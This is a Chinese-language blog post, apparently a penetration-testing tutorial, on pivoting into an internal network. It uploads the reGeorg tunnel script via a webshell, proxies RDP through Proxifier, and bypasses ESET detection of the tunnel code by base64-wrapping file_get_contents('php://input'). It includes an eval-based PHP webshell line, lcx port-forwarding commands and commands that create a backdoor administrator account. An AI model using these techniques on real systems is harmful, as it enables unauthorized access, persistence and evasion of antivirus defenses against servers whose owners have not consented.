---
title: 内网渗透之reGeorg-Proxifier
categories:
  - Web安全
tags:
  - 内网安全
  - Windows
  - reGeorg
  - Proxifier
abbrlink: 3328f9cc
date: 2018-10-19 10:34:06
---

&#8195;&#8195;内网渗透常见一个场景就是双内网：目标服务器在内网，自己的机器也在内网。当你有一个system的webshell时候(也不是必须system，能把脚本完整上传即可)，发现是内网Windows系统，该如何3389呢？reGeorg+Proxifier是一个比较好的选择。
<!-- more -->

## 步骤：
### 下载工具；
- 下载[reGeorg](https://github.com/sensepost/reGeorg)，reGeorg主要由两部分组成：各种版本的脚本文件tunnel和一个python文件reGeorgSocksProxy.py。
- 下载[Proxifier](http://www.proxifier.com/)，Proxifier是一款功能非常强大的socks客户端，说白了FoxyProxy可以让火狐走代理，那么Proxifier可以让MSTSC等软件走代理。  

### 上传脚本
上传相应版本的脚本到目标站点，比如tunnel.nosocket.php，然后访问`http://192.168.0.6/tunnel.nosocket.php`
- 访问正常，显示Georg says, 'All seems fine'。
- 访问异常，分析报错信息，下载tunnel.nosocket.php看看是否和自己上传的一样，一般情况敏感语句被拦截会导致你上传的文件异常，比如“file_get_contents("php://input");”就极易被拦截，这时候要想办法绕过。

### 配置Proxifier
- Direct不走代理；Block阻断；Proxy走代理。要注意的是python.exe设置Direct，不然据说会引起死循环，我们要远控，所以设置MSTSC为代理模式，如图：
![proxifier](/imgs/proxifier.png)

### 运行reGeorg
- 运行reGeorgSocksProxy.py，需要一些三方库比如urllib3，按需安装。
```bash
python reGeorgSocksProxy.py -p 8080 -u http://192.168.0.6/tunnel.nosocket.php
```

### mstsc连接
- 输入目标站点地址192.168.0.6，连接可以看到数据通过了代理127.0.0.1:8080 
![proxifier-info](/imgs/proxifier-info.png)
![mstsc](/imgs/mstsc.png)

## 问题&引申
### bypass
&#8195;&#8195;访问tunnel.nosocket.php时候遇到一个错误，如图：
![error1](/imgs/error1.png)
&#8195;&#8195;百度这个错误的话会有很多答案，可能是权限问题，可能是配置问题，但这里实际上是文件上传失败，下载回来可以看到tunnel.nosocket.php并非我们上传的文件，而是一行乱码，也就是上传过程中触发了什么导致失败，更改后缀也无效,可能是敏感函数被拦截。毕竟服务器上有个ESET，尝试绕一下：
tunnel.nosocket.php 
```php
<?php

ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);
error_reporting(E_ERROR | E_PARSE);

if( !function_exists('apache_request_headers') ) {
    /* A 省略
    */
}
if ($_SERVER['REQUEST_METHOD'] === 'GET')
{
    exit("Georg says, 'All seems fine'");
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    set_time_limit(0);
    $headers=apache_request_headers();
    $cmd = $headers["X-CMD"];
    switch($cmd){
        /* B 省略
        */
        #  C
	case "FORWARD":
	    {
                @session_start();
                $running = $_SESSION["run"];
		session_write_close();
                if(!$running){
                    header('X-STATUS: FAIL');
	            header('X-ERROR: No more running, close now');
                    return;
                }
                header('Content-Type: application/octet-stream');
		$rawPostData = file_get_contents("php://input");
		if ($rawPostData) {
		    @session_start();
		    $_SESSION["writebuf"] .= $rawPostData;
		    session_write_close();
		    header('X-STATUS: OK');
                    header("Connection: Keep-Alive");
		    return;
		} else {
		    header('X-STATUS: FAIL');
		    header('X-ERROR: POST request read filed');
		}
	    }
	    break;
    }
}
?>

```
&#8195;&#8195;几经尝试最后推测是$rawPostData = file_get_contents("php://input");的原因。把代码分为ABC三部分，AB部分感觉相关性不大就不贴了，说来奇怪：
- 上传未删减的全部代码，失败；
- 注释掉这一句，上传未删减的全部代码，成功，推测可能是这个函数导致；
- 单独上传以上删减后的代码，成功，删除掉的代码并不包含$rawPostData，该变量也只出现在C部分，既然$rawPostData这句是敏感代码，为何能上传成功？请大佬赐教。

&#8195;&#8195;虽然没想明白，但还是用这句话做文章吧，看能否绕过：
- 尝试1，想当然的把代码更改为：
```php
<?php
/* 省略
*/
#$rawPostData = file_get_contents("php://input");
$a = "file_get_conten";
$b = "ts(\"php://input\");";
$rawPostData = eval($a.$b);
/* 省略
*/
?>
```
&#8195;&#8195;可以成功访问`http://192.168.0.6/tunnel.nosocket.php`，但是也只能说明GET请求无误，3389连接的时候还是出错了，陷入绝望，明明代码传成功了。回顾一下过程，决定测试一下拼接的函数是否有问题，果然出了问题，本地测试代码：
```php
<?php
echo "<br/>"."------原函数-------"."<br/>";
$data=file_get_contents('php://input');
echo $data."<br/>";
@eval(file_get_contents('php://input'));

echo "<br/>"."------方法1-------"."<br/>";
$a = "file_get_conte";
$b = "nts('php://input');";
echo "a+b=".$a.$b."<br/>";
eval($a.$b);

echo "<br/>"."------方法2-------"."<br/>";
$c = base64_decode('ZmlsZV9nZXRfY29udGVudHMoJ3BocDovL2lucHV0Jyk7');
echo "c=".$c."<br/>";
eval($c);

echo "<br/>"."------方法3-------"."<br/>";
$d = base64_encode(file_get_contents('php://input'));
echo "d=".$d."<br/>";
$e = base64_decode($d);
echo "e=".$e."<br/>";
eval($e);
?>
```
&#8195;&#8195;从截图可以看出，之前用的方法，拼接后的函数失效了,前两种方法并没有执行pwd命令，第三种方法严格说并没有改变file_get_contents('php://input')的形式，但起码函数没有失效。
![file_get_contents](/imgs/file_get_contents.png)
代码改为如下：
```php
<?php
/* 省略
*/
#$rawPostData = file_get_contents("php://input");
$a = base64_encode(file_get_contents('php://input'));
$rawPostData = base64_decode($a);
/* 省略
*/
?>
```
&#8195;&#8195;运行reGeorgSocksProxy.py脚本，mstsc连接成功。这种方法只是对获取的数据做了一次base64加密，但却成功上传，猜测拦截并非针对函数本身，而是对接收到的数据。

### 代理
为什么要用代理？众所周知公网IP全球唯一，但是内网IP并不唯一，远控无非三种场景：
- 公网到公网，可以直接连接；
- 公网到内网，假如你有一台公网服务器A，你想3389一台内网服务器B，直接连接是不行的，但是可以通过端口转发的方式达到目的，常用工具比如lcx，在内网机器B执行`lcx -slave A的IP 51 192.168.0.6 3389`，表示将本机IP地址为192.168.0.6的3389端口转发到公网服务器A的51端口，然后在公网服务器执行`lcx -listen 51 3389`，表示监听51端口，该端口主要是接受被控制计算机3389端口转发过来的数据，然后可以在服务器A上使用127.0.0.1来远程登录服务器B。
- 内网到内网，reGeorg其实是一个正向的Web代理，把内网服务器的端口通过 http/https 隧道转发到本机，形成一个回路，Proxifier是一个端口转发工具，以此达到穿透内网的效果。

### php://input
&#8195;&#8195;`php://input`是个可以访问请求的原始数据的只读流，也就是可以读取没有处理过的POST数据，`$_POST` 和 `php://input` 的区别：
- 当 HTTP POST 请求的 Content-Type 是 application/x-www-form-urlencoded 或 multipart/form-data 时，会将变量以关联数组形式传入当前脚本。
- php://input 是个可以访问请求的原始数据的只读流。 enctype="multipart/form-data" 的时候php://input 是无效的。

这里也有个问题没想明白就是为什么前两种拼接方式会使`file_get_contents('php://input')`失效？

### 常用命令
```shell
tasklist
taskkill /pid id1 /pid id2 -t -f
net user test test /add
net localgroup administrators test /add
net user test /delete
arp -a
```

## 参考
[内网端口转发及穿透](https://blog.csdn.net/Fly_hps/article/details/80634250)
[代理转发工具汇总分析](https://www.cnblogs.com/shellr00t/p/5856361.html)
